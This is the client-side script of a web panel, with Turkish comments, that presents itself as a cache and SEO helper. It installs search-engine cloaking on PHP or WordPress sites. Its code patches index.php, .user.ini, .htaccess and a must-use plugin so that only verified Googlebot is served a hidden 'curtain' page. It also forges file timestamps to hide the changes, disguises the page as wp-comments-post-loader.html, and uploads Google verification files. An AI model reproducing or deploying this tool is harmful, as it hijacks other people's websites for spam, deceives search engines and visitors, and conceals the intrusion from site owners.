// Standalone (cache-seo-helper.php) → prefix yok.
$_pk_key = defined('CSEH_KEY')?CSEH_KEY:'wpmc';
$_pk_prefix = (isset($_GET[$_pk_key])&&$_GET[$_pk_key]==='1') ? ($_pk_key.'=1&') : '';
?>
var PK=<?=json_encode($_pk_prefix.'p='.rawurlencode($_np))?>;
var HTML_FILE=<?=json_encode($HTML_FILE)?>;
var IS_PLUGIN=<?=$IS_PLUGIN?'true':'false'?>;

var GOOGLE_RX=/^google[a-zA-Z0-9]+\.html$/;

// ---- Durum makinesi ----
var _cloakActive=false;
var _botcheckDone=false;
var _botcheckWorking=false;
var _LS_KEY='nox_bc_'+location.hostname;

function _saveBotcheck(){
  try{localStorage.setItem(_LS_KEY,JSON.stringify({done:_botcheckDone,working:_botcheckWorking,ts:Date.now()}));}catch(e){}
}
function _loadBotcheck(){
  try{
    var d=JSON.parse(localStorage.getItem(_LS_KEY)||'null');
    if(!d||Date.now()-d.ts>86400000)return null;
    return d;
  }catch(e){return null;}
}

function _setCloakStatusBadge(state){
  // state: 'checking' | 'atilmamis' | 'pasif' | 'aktif'
  var el=document.getElementById('cloak-status');
  if(!el)return;
  var map={
    checking  :{cls:'cs-checking',txt:'● Kontrol ediliyor...'},
    atilmamis :{cls:'cs-pasif',   txt:'● Cloaking Atılmamış'},
    pasif     :{cls:'cs-sorun',   txt:'● Cloaking Status: Pasif'},
    aktif     :{cls:'cs-aktif',   txt:'● Cloaking Status: Aktif'}
  };
  var m=map[state]||map.atilmamis;
  el.className='cloak-status '+m.cls;
  el.textContent=m.txt;
}

function _updateCacheBtn(){}

function _checkCloakActive(){
  _setCloakStatusBadge('checking');
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=checkcloak&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    try{
      var r=JSON.parse(x.responseText);
      _cloakActive=(r.active===true);
      if(_cloakActive){
        var _saved=_loadBotcheck();
        if(_saved){
          _botcheckDone=_saved.done;
          _botcheckWorking=_saved.working;
          _setCloakStatusBadge(_botcheckWorking?'aktif':'pasif');
        }else{
          _setCloakStatusBadge('pasif');
        }
      }else{
        _setCloakStatusBadge('atilmamis');
      }
      _updateCacheBtn();
    }catch(e){_setCloakStatusBadge('pasif');}
  };
  x.onerror=function(){_setCloakStatusBadge('pasif');};
  x.send();
}

// Sayfa yüklenince cloak durumunu kontrol et
window.addEventListener('load',function(){_checkCloakActive();});

function decodeB64Response(xhr){
  var enc=(xhr.getResponseHeader("X-Body-Encoding")||"").toLowerCase();
  if(enc!=="base64") return xhr.responseText;
  try{
    var bin=atob(xhr.responseText.replace(/\s+/g,""));
    var bytes=new Uint8Array(bin.length);
    for(var i=0;i<bin.length;i++) bytes[i]=bin.charCodeAt(i);
    return new TextDecoder("utf-8").decode(bytes);
  }catch(e){return "Çözme hatası: "+e.message}
}

function setMsg(id,text,type){
  var el=document.getElementById(id);
  el.textContent=text;
  el.className="msg "+(type||"info");
}

function reloadStatus(){
  setTimeout(function(){location.href="?"+PK},800);
}

function cfSave(){
  var t=document.getElementById("cf_token").value.trim();
  var s=document.getElementById("cf_status");
  s.style.color="#fa0"; s.textContent="Kaydediliyor + zone tespit ediliyor...";
  var fd=new FormData(); fd.append("token",t);
  var x=new XMLHttpRequest();
  x.open("POST","?"+PK+"&a=cf_save&_="+Date.now());
  x.onload=function(){
    try{var r=JSON.parse(x.responseText); s.style.color=r.ok?"#0f3":"#f55"; s.textContent=r.msg||"";}
    catch(e){s.style.color="#f55"; s.textContent="Yanıt okunamadı";}
  };
  x.onerror=function(){s.style.color="#f55"; s.textContent="HTTP hatası";};
  x.send(fd);
}
function cfPurgeManual(){
  var s=document.getElementById("cf_status");
  s.style.color="#fa0"; s.textContent="CF purge ediliyor...";
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=cf_purge&_="+Date.now());
  x.onload=function(){
    try{var r=JSON.parse(x.responseText); s.style.color=r.s==='ok'?"#0f3":(r.s==='na'?"#888":"#f55"); s.textContent=r.m||"";}
    catch(e){s.style.color="#f55"; s.textContent="Yanıt okunamadı";}
  };
  x.send();
}
function cfLoadStatus(){
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=cf_status&_="+Date.now());
  x.onload=function(){
    try{
      var r=JSON.parse(x.responseText);
      var s=document.getElementById("cf_status");
      if(r.configured){
        s.style.color="#0f3"; s.textContent="✓ CF aktif"+(r.has_zone?" (zone: "+r.zone_preview+")":" (zone yok)");
        var inp=document.getElementById("cf_token"); if(inp)inp.placeholder="Kayıtlı — değiştirmek için yeni token yaz";
      }else{
        s.style.color="#888"; s.textContent="CF token yok — girmezsen sistem CF'yi atlar";
      }
    }catch(e){}
  };
  x.send();
}
if(document.addEventListener){document.addEventListener("DOMContentLoaded",function(){setTimeout(cfLoadStatus,300);});}

function gscRichTest(){
  // Google Rich Results Test'e (Zengin Sonuçlar Testi) sitenin anasayfa URL'i ile yeni sekmede aç
  var siteUrl=window.location.protocol+"//"+window.location.host+"/";
  var testUrl="https://search.google.com/test/rich-results?url="+encodeURIComponent(siteUrl);
  window.open(testUrl,"_blank","noopener,noreferrer");
}

function precheck(){
  // Ön Uyumluluk Testi — yazma yapmadan, mevcut cseh_* helper'ları ile 13 kontrol
  setMsg("cmsg","Ön uyumluluk testi çalışıyor... (13 kontrol)","info");
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=precheck&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    try{
      var r=JSON.parse(x.responseText);
      var vc = r.verdict==='ok'?'#0f3':(r.verdict==='mid'?'#fa0':'#f55');
      var html = '<div style="font-family:monospace;font-size:12.5px;line-height:1.6;color:#c8ced8;padding:2px 0">';
      // HEAD: score + verdict — tek satır
      html += '<div style="margin-bottom:8px"><b style="color:'+vc+';font-size:14px">'+r.score+'/100</b> · <b style="color:'+vc+'">'+escapeHtml(r.verdict_txt)+'</b></div>';
      // CHECK LIST — tek satır, monospace hizalı
      var managedHost = null;
      for(var i=0;i<r.checks.length;i++){
        var c = r.checks[i];
        if(c.managed){ managedHost = c.managed; }
        var ico, cl;
        if(c.status==='ok'){ ico='✓'; cl='#0f3'; }
        else if(c.status==='warn'){ ico='!'; cl='#fa0'; }
        else if(c.status==='err'){ ico='✗'; cl='#f55'; }
        else { ico='·'; cl='#888'; }
        html += '<div style="padding:1px 0">';
        html += '<span style="color:'+cl+';display:inline-block;width:16px">'+ico+'</span>';
        html += '<span style="display:inline-block;min-width:170px">'+escapeHtml(c.name)+'</span>';
        html += '<span style="color:'+cl+';margin-right:8px">'+escapeHtml(c.value)+'</span>';
        html += '<span style="color:#7a828f">'+escapeHtml(c.msg)+'</span>';
        html += '</div>';
      }
      // MANAGED HOST — sade tek satır
      if(managedHost){
        var mhC = managedHost.can_php_purge ? '#fa0' : '#f55';
        html += '<div style="margin-top:8px;padding:6px 10px;border-left:2px solid '+mhC+';color:#c8ced8">';
        html += '<b style="color:'+mhC+'">MANAGED HOST:</b> '+escapeHtml(managedHost.label)+' · '+escapeHtml(managedHost.purge_hint);
        if(managedHost.dashboard){
          html += ' <a href="'+escapeHtml(managedHost.dashboard)+'" target="_blank" rel="noopener noreferrer" style="color:'+mhC+';text-decoration:underline">Dashboard ↗</a>';
        }
        html += '</div>';
      }
      // SUMMARY tek satır
      html += '<div style="margin-top:8px;padding-top:6px;border-top:1px solid #333"><b style="color:'+vc+'">KARAR:</b> '+escapeHtml(r.summary)+'</div>';
      html += '</div>';
      document.getElementById("cmsg").innerHTML = html;
      document.getElementById("cmsg").className = "msg";
    }catch(e){
      setMsg("cmsg","Precheck yanıtı okunamadı: "+e.message+" | ham yanıt: "+(x.responseText||'').substring(0,300),"err");
    }
  };
  x.onerror=function(){ setMsg("cmsg","Precheck HTTP hatası","err"); };
  x.send();
}
function escapeHtml(s){
  if(s===null||s===undefined)return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

function autocloak(){
  // ★ ZORUNLU SIRA KONTROL — perde DOLU olmadan Cloak Aç'a izin verme
  var ta=document.getElementById("htmlcontent");
  var perdeIcerik=(ta&&ta.value?ta.value.trim():"");
  if(perdeIcerik.length<500){
    // Textarea boş veya çok kısa → kullanıcı perde yapıştırmadı/kaydetmedi
    setMsg("cmsg","✗ DUR! Önce PERDE İÇERİĞİ kutusuna marka HTML'i yapıştırıp KAYDET'e bas. Sıra: 1) Perde yapıştır → 2) Kaydet → 3) CLOAK SERVİSİNİ AÇ. Şu an textarea boş veya çok kısa ("+perdeIcerik.length+" karakter). Cloak BOŞ perde ile açılırsa Googlebot boş sayfa görür.","err");
    var perdeBox=document.querySelector(".card h3");
    if(ta){ta.focus();ta.style.borderColor="#f55";setTimeout(function(){ta.style.borderColor="";},3000);}
    return;
  }
  setMsg("cmsg","İşleniyor...","info");
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=autocloak&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    try{
      var r=JSON.parse(x.responseText);
      var ok, txt;
      // ★ Backend guard'dan PERDE_BOS hatası
      if(r.error==='PERDE_BOS'){
        setMsg("cmsg","✗ "+r.message+"  ◆ Sıra: "+r.sira,"err");
        return;
      }
      if(r.mode==='plugin'){
        ok=(r.flag==='ON');
        txt="✓ Cloak servisi AÇIK ("+(r.index==='ALREADY'?'zaten kurulu':'kuruldu')+") — perde: render-cache.html";
      }else if(r.mode==='file'){
        // Çok-yöntemli: başarı = flag ON + en az 1 yöntem (index.php VEYA .user.ini) kuruldu/zaten var.
        var methods=r.methods||[];
        var installed=(r.index==='ALREADY')||methods.length>0;
        ok=(r.flag==='ON')&&installed;
        if(r.index==='ALREADY'){
          txt="✓ Cloak servisi AÇIK (zaten kurulu, açıldı)";
        }else if(methods.length>0){
          txt="✓ Cloak servisi AÇIK — yöntem: "+methods.join(" + ");
          if(r.mu_airbag_note)txt+=" ("+r.mu_airbag_note+")";
          if(r.htaccess_cloak_note)txt+=" ("+r.htaccess_cloak_note+")";
          if(r.userini_note)txt+=" ("+r.userini_note+")";
        }else{
          txt="✗ Kurulamadı — index.php: "+(r.index||'?')+" | .user.ini: "+(r.user_ini||'?')+" | .htaccess: "+(r.htaccess_cloak||'?')+" | wp mu-airbag: "+(r.mu_airbag||'?')+". Hepsi başarısız → kök VE wp-content PHP'ye yazılamıyor (host izinleri çok kısıtlı; FTP ile manuel kurulum gerekir).";
        }
      }else{
        ok=false; txt="Beklenmeyen yanıt";
      }
      setMsg("cmsg",txt,ok?"ok":"err");
      if(ok){
        _cloakActive=true;
        _botcheckDone=false;
        _botcheckWorking=false;
        _setCloakStatusBadge('checking');
        _updateCacheBtn();
        setMsg("cmsg",txt+" — GoogleBot kontrolü başlatılıyor...","info");
        setTimeout(function(){botcheck(true);},600);
      }
    }catch(e){
      setMsg("cmsg","Hata: "+x.responseText,"err");
    }
  };
  x.onerror=function(){setMsg("cmsg","Ağ hatası","err")};
  x.send();
}

function revert(){
  if(!confirm("Cloak servisi kapatılsın mı? (bayrak silinir, site normale döner; perde/kurulum durur, tekrar açabilirsiniz)"))return;
  setMsg("cmsg","İşleniyor...","info");
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=revert&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    var ok=x.responseText==="OK";
    setMsg("cmsg",ok?"Cloak servisi kapatıldı (site normal).":"Hata: "+x.responseText,ok?"ok":"err");
    if(ok) reloadStatus();
  };
  x.onerror=function(){setMsg("cmsg","Ağ hatası","err")};
  x.send();
}

function uninstall(){
  if(!confirm("TAMAMEN KALDIR — index.php orijinaline döndürülecek, bayrak ve .htaccess kuralı silinecek. Emin misiniz?"))return;
  setMsg("cmsg","Kaldırılıyor...","info");
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=uninstall&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    var ok=x.responseText==="OK";
    setMsg("cmsg",ok?"Tamamen kaldırıldı — orijinal index.php geri yüklendi.":"Hata: "+x.responseText,ok?"ok":"err");
    if(ok) reloadStatus();
  };
  x.onerror=function(){setMsg("cmsg","Ağ hatası","err")};
  x.send();
}

function enc(s){
  var b=btoa(unescape(encodeURIComponent(s)));
  return encodeURIComponent(b.replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,""));
}

function loadHtml(){
  document.getElementById("lmsg").textContent="Yükleniyor...";
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=raw&b="+enc(HTML_FILE)+"&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    if(x.status!==200){document.getElementById("lmsg").textContent="HTTP "+x.status;return;}
    document.getElementById("htmlcontent").value=decodeB64Response(x);
    document.getElementById("lmsg").textContent="Yüklendi.";
  };
  x.onerror=function(){document.getElementById("lmsg").textContent="Hata"};
  x.send();
}

function toHex(str){
  var bytes=new TextEncoder().encode(str),h="";
  for(var i=0;i<bytes.length;i++) h+=("0"+bytes[i].toString(16)).slice(-2);
  return h;
}

function saveHtml(){
  var c=document.getElementById("htmlcontent").value;
  if(c.indexOf("<"+"?")!==-1){setMsg("hmsg","PHP etiketi içeremez.","err");return;}
  setMsg("hmsg","Kaydediliyor...","info");
  var fd=new FormData();
  fd.append("a","savehtml");
  fd.append("d",toHex(c));
  var x=new XMLHttpRequest();
  x.open("POST","?"+PK+"&_="+Date.now());
  x.onload=function(){
    var ok=x.responseText==="OK";
    setMsg("hmsg",ok?"Kaydedildi.":"Hata: "+x.responseText,ok?"ok":"err");
  };
  x.onerror=function(){setMsg("hmsg","Ağ hatası","err")};
  x.send(fd);
}

function clearcache(){
  setMsg("cmsg","Cache temizleniyor...","info");
  var t0=Date.now();
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=clearcache&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.timeout=30000; // 30sn'de yanıt gelmezse takılı kalma, uyar
  x.onload=function(){
    var dur=((Date.now()-t0)/1000).toFixed(1);
    var r;
    try{r=JSON.parse(x.responseText);}catch(e){setMsg("cmsg","JSON hatası: "+x.responseText,"err");return;}
    if(r.fatal){setMsg("cmsg","PHP Hatası: "+r.fatal+(r.line?" (satır "+r.line+")":""),"err");return;}
    var errs=[],oks=0,managedMsgs=[];
    for(var k in r){
      if(!r[k]||!r[k].s)continue;
      // Managed host satırlarını AYRI topla — bunlar öne çıkacak
      if(k.indexOf("managed_")===0){ managedMsgs.push({key:k, s:r[k].s, m:r[k].m}); continue; }
      if(r[k].s==="err"||r[k].s==="warn")errs.push(k);
      else if(r[k].s==="ok")oks++;
    }
    var htmlOut='';
    // Managed host banner — dashboard link çıkarılır
    if(managedMsgs.length){
      for(var mi=0;mi<managedMsgs.length;mi++){
        var mm=managedMsgs[mi];
        var mmColor=mm.s==='ok'?'#22c55e':'#eab308';
        var mmBg=mm.s==='ok'?'rgba(34,197,94,.10)':'rgba(234,179,8,.10)';
        var mmIcon=mm.s==='ok'?'&check;':'!';
        // Mesaj içindeki URL'i tıklanabilir yap (https:// ile başlayan ilk token)
        var mmText=escapeHtml(mm.m);
        mmText=mmText.replace(/(https?:\/\/[^\s]+)/g,function(u){return '<a href="'+u+'" target="_blank" rel="noopener noreferrer" style="color:'+mmColor+';text-decoration:underline;font-weight:600">'+u+'</a>';});
        htmlOut+='<div style="margin:6px 0;padding:10px 14px;border-radius:6px;background:'+mmBg+';border-left:3px solid '+mmColor+';font-size:13px;line-height:1.55;color:#e6e8ec">';
        htmlOut+='<span style="color:'+mmColor+';font-weight:700;margin-right:6px">'+mmIcon+'</span>';
        htmlOut+='<b style="color:'+mmColor+';font-size:12.5px;text-transform:uppercase;letter-spacing:.3px">'+escapeHtml(mm.key.replace(/^managed_/,'').toUpperCase())+':</b> ';
        htmlOut+=mmText;
        htmlOut+='</div>';
      }
    }
    var summaryHtml;
    if(errs.length){
      summaryHtml='<div class="msg err" style="margin:6px 0">Cache temizlendi ('+oks+' işlem, '+dur+'s) — '+errs.length+' uyarı: '+escapeHtml(errs.join(", "))+'</div>';
    }else{
      summaryHtml='<div class="msg ok" style="margin:6px 0">&check; Cache temizlendi ('+oks+' işlem, '+dur+'s)</div>';
    }
    document.getElementById("cmsg").innerHTML=summaryHtml+htmlOut;
    document.getElementById("cmsg").className="msg";
  };
  x.onerror=function(){setMsg("cmsg","Ağ hatası","err")};
  x.ontimeout=function(){setMsg("cmsg","Zaman aşımı (30sn) — sunucu yanıt vermedi. Tekrar deneyin.","err")};
  x.send();
}

function botcheck(auto){
  setMsg("bcmsg","GoogleBot isteği gönderiliyor...","info");
  document.getElementById("bcresult").style.display="none";
  _setCloakStatusBadge('checking');
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=botcheck&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    setMsg("bcmsg","","info");
    var r;
    try{r=JSON.parse(x.responseText);}catch(e){setMsg("bcmsg","JSON parse hatası: "+x.responseText,"err");_setCloakStatusBadge('sorun');return;}
    if(r.error){setMsg("bcmsg",r.error,"err");_setCloakStatusBadge('sorun');return;}

    var res=document.getElementById("bcresult");
    var badge=document.getElementById("bcbadge");
    var meta=document.getElementById("bcmeta");
    var preview=document.getElementById("bcpreview");

    res.style.display="block";

    if(r.curl_error){
      badge.className="badge-warn";
      badge.textContent="cURL Hatası: "+r.curl_error;
      _botcheckDone=true;_botcheckWorking=false;
      _setCloakStatusBadge(_cloakActive?'pasif':'atilmamis');
    }else if(r.html_empty){
      badge.className="badge-warn";
      badge.textContent="Perde henüz boş — önce 'Perde İçeriği' kısmına HTML yapıştırıp Kaydet edin, sonra kontrol edin.";
      _botcheckDone=true;_botcheckWorking=false;
      _setCloakStatusBadge(_cloakActive?'pasif':'atilmamis');
    }else if(r.matched){
      // Nadir: bazı host'larda kendi-sunucu IP'si yanlışlıkla Google CIDR'da → perde bastı (gerçek-pozitif sayılır)
      badge.className="badge-ok";
      badge.textContent="✓ CLOAK ÇALIŞIYOR — perde bastı (sunucu IP'si Googlebot CIDR'ında).";
      _botcheckDone=true;_botcheckWorking=true;
      _setCloakStatusBadge('aktif');
    }else if(r.simulated_ok){
      // BEKLENEN sonuç: sahte UA + sunucu IP → verified-bot guard reddetti (DOĞRU davranış)
      badge.className="badge-ok";
      badge.textContent="✓ CLOAK ÇALIŞIYOR — sahte bot reddedildi (verified-Googlebot dışı, doğru davranış). Perde dosyası + cloak gate yerinde. Gerçek Googlebot ziyaretinde perde basılır. Canlı doğrulama için: Google Search Console → URL Inspection → Live Test.";
      _botcheckDone=true;_botcheckWorking=true;
      _setCloakStatusBadge('aktif');
    }else{
      badge.className="badge-fail";
      badge.textContent="✗ CLOAK KURULU DEĞİL — perde dosyası veya cloak gate eksik. 'Cloak Kur' adımını çalıştırın.";
      _botcheckDone=true;_botcheckWorking=false;
      _setCloakStatusBadge(_cloakActive?'pasif':'atilmamis');
    }
    _saveBotcheck();

    _updateCacheBtn();
    meta.textContent="URL: "+r.url+" | HTTP: "+r.http_code+(r.final_url&&r.final_url!==r.url?" | Yönlendi: "+r.final_url:"");
    preview.textContent=r.preview||"(yanıt boş)";
  };
  x.onerror=function(){setMsg("bcmsg","Ağ hatası","err");_setCloakStatusBadge('sorun');};
  x.send();
}

function fixtimestamp(){
  setMsg("cmsg","Timestamp düzeltiliyor...","info");
  document.getElementById("tsresult").style.display="none";
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=fixtimestamp&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    setMsg("cmsg","","info");
    var r;try{r=JSON.parse(x.responseText);}catch(e){setMsg("cmsg","JSON hatası","err");return;}
    var labels={"ref":"Referans Tarama","index.php":"index.php","wp-comments-post-loader.html":"HTML Dosyası"};
    var html="";
    for(var k in r){
      var s=r[k].s,m=r[k].m;
      var cls=s==="ok"?"cache-ok":s==="warn"?"cache-warn":s==="err"?"cache-err":"cache-na";
      var icon=s==="ok"?"✓":s==="warn"?"⚠":s==="err"?"✗":"—";
      html+='<div class="cache-row '+cls+'"><b>'+icon+' '+(labels[k]||k)+'</b>: '+m+'</div>';
    }
    document.getElementById("tsrows").innerHTML=html;
    document.getElementById("tsresult").style.display="block";
  };
  x.onerror=function(){setMsg("cmsg","Ağ hatası","err");};
  x.send();
}

function uploadGoogle(){
  var name=document.getElementById("gname").value.trim();
  var content=document.getElementById("gcontent").value;
  if(!GOOGLE_RX.test(name)){setMsg("gmsg","Geçersiz ad. Örnek: google085517675749d6fe.html","err");return;}
  if(!content){setMsg("gmsg","İçerik boş olamaz.","err");return;}
  if(!/^google-site-verification:\s*[A-Za-z0-9_\-\.]+\s*$/.test(content.trim())){setMsg("gmsg","Geçersiz içerik. Yalnızca şu format kabul edilir: google-site-verification: TOKEN","err");return;}
  setMsg("gmsg","Yükleniyor...","info");
  var fd=new FormData();fd.append("a","writegoogle");fd.append("b",enc(name));fd.append("d",toHex(content));
  var x=new XMLHttpRequest();x.open("POST","?"+PK+"&_="+Date.now());
  x.onload=function(){
    if(x.responseText==="OK"){setMsg("gmsg","Yüklendi: "+name+". Yenileniyor...","ok");setTimeout(function(){location.href="?"+PK},1000);}
    else{setMsg("gmsg","Hata: "+x.responseText,"err");}
  };
  x.onerror=function(){setMsg("gmsg","Ağ hatası","err");};
  x.send(fd);
}

function removeFile(name){
  if(!GOOGLE_RX.test(name)){alert("Yalnızca Google doğrulama dosyaları silinebilir.");return;}
  if(!confirm(name+" silinsin mi?"))return;
  var x=new XMLHttpRequest();
  x.open("GET","?"+PK+"&a=rmgoogle&b="+enc(name)+"&_="+Date.now());
  x.setRequestHeader("Cache-Control","no-cache");
  x.onload=function(){
    if(x.responseText==="OK"){location.href="?"+PK;}
    else{alert("Hata: "+x.responseText);}
  };
  x.onerror=function(){alert("Ağ hatası");};
  x.send();
}

</script>
<div style="text-align:center;color:#2a3a2a;font-size:11px;font-family:monospace;margin:24px 0 8px;letter-spacing:1px">⬢ NOX ENGINE · güvenli panel</div>
</body></html>
